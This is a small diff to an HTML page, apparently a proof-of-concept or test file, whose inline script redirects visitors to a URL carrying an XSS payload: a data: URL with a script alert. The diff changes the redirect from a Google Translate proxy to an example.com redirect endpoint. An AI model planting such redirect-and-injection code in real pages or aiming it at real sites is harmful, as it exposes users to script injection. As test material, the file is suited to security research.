@@ -7,7 +7,8 @@
 <body>
     <script>
         // Redirect to a URL with a payload XSS
-        window.location.href = "https://translate.google.com/translate?sl=auto&tl=en&u=" + encodeURIComponent("data:text/html,<script>alert('XSS');</script>");
+        window.location.href = "https://example.com/redirect?url=" + encodeURIComponent("data:text/html,<script>alert('XSS');</script>");
     </script>
 </body>
 </html>
+
